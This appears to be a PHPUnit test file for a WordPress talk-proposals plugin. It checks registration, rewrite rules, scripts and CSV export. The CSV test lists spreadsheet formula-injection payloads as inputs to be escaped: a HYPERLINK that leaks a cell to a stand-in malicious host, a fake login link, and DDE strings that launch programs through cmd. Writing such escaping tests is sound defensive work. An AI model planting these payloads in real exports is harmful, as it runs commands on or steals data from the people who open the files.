<?php

/**
 * @group functions
 */
class WordCampTalkProposalsTest_Core_Functions extends WordCampTalkProposalsTest {

	public function test_wct_register_post_type() {
		$registered_post_types = get_post_types();

		$this->assertTrue( isset( $registered_post_types['talks'] ) );
	}

	public function test_wct_register_post_statuses() {
		$registered_post_statuses = get_post_stati( array(
			'private'     => true,
			'_is_wc_talk' => true,
		) );

		$this->assertEquals( array_values( $registered_post_statuses ), array(
			'wct_pending',
			'wct_shortlist',
			'wct_selected',
			'wct_rejected',
		) );
	}

	public function test_wct_register_taxonomies() {
		$taxonomies = array(
			wct_get_tag(),
			wct_get_category(),
		);

		$exists = array_map( 'taxonomy_exists', $taxonomies );

		$this->assertTrue( 2 === count( array_filter( $exists ) ) );
	}

	public function test_wct_add_rewrite_tags() {
		$rewrite = $GLOBALS['wp_rewrite'];

		$rewrite_tags = array(
			'%' . wct_user_rewrite_id() . '%',
			'%' . wct_user_rates_rewrite_id() . '%',
			'%' . wct_user_to_rate_rewrite_id() . '%',
			'%' . wct_user_talks_rewrite_id() . '%',
			'%' . wct_user_comments_rewrite_id() . '%',
			'%' . wct_action_rewrite_id() . '%',
			'%' . wct_search_rewrite_id() . '%',
			'%' . wct_cpage_rewrite_id() . '%',
		);

		$this->assertTrue( count( array_intersect( $rewrite->rewritecode, $rewrite_tags ) ) === count( $rewrite_tags ) );
	}

	public function test_wct_add_rewrite_rules() {
		$rewrite = $GLOBALS['wp_rewrite'];

		$this->assertTrue( isset( $rewrite->rules[sprintf( '%s/([^/]+)/?$', wct_action_slug() )] ) );
	}

	public function test_wct_add_permastructs() {
		$rewrite = $GLOBALS['wp_rewrite'];

		$this->assertTrue( isset( $rewrite->extra_permastructs[ wct_user_rewrite_id() ] ) );
		$this->assertTrue( isset( $rewrite->extra_permastructs[ wct_action_rewrite_id() ] ) );
	}

	public function test_wct_load_textdomain() {
		$this->assertTrue( is_textdomain_loaded( 'wordcamp-talks' ) );
	}

	public function test_wct_register_scripts() {
		$registered = wp_scripts()->registered;
		wct_set_global( 'is_talks', true );

		do_action( 'wp_enqueue_scripts' );

		$this->assertTrue( isset( wp_scripts()->registered['jquery-raty'] ) );
		$this->assertTrue( isset( wp_scripts()->registered['tagging'] ) );

		wct_set_global( 'is_talks', false );
		wp_scripts()->registered = $registered;
	}

	public function test_wct_set_user_feedback() {
		$feedback_url = add_query_arg( 'success', 1, wct_get_root_url() );

		$this->go_to( $feedback_url );

		do_action( 'template_redirect' );

		$this->assertTrue( isset( wct_get_global( 'feedback' )['success'] ) );
	}

	/**
	 * @group wordcamp
	 */
	public function test_wct_is_signup_allowed() {
		$this->assertTrue( wct_is_wordcamp_site() );
	}

	public function sanitize_csv( $content ) {
		return str_replace( array( '&#8212;', '"' ), array( 0, "'" ), $content );
	}

	/**
	 * @covers wct_generate_csv_content
	 * @group esc_csv
	 */
	public function test_wct_generate_csv_content() {
		$test_input = array(
			// Safe
			'WordCamp Talks',

			// Cells starting with trigger characters
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
			";2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;=cmd|' /C SoundRecorder'!A0",
			"foo\n-2+3+cmd|' /C explorer'!A0",
			"   -2+3+cmd|' /C notepad'!A0",
			" -2+3+cmd|' /C calc'!A0",
		);

		$expected_output = array(
			// Safe
			'WordCamp Talks',

			// Cells starting with trigger character
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
			"';2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;'=cmd|' /C SoundRecorder'!A0",
			"foo '-2+3+cmd|' /C explorer'!A0",
			"'-2+3+cmd|' /C notepad'!A0",
			"'-2+3+cmd|' /C calc'!A0",
		);

		$this->assertEquals(
			array_map( array( $this, 'sanitize_csv' ), $expected_output ),
			array_map( 'wct_generate_csv_content', $test_input )
		);
	}
}
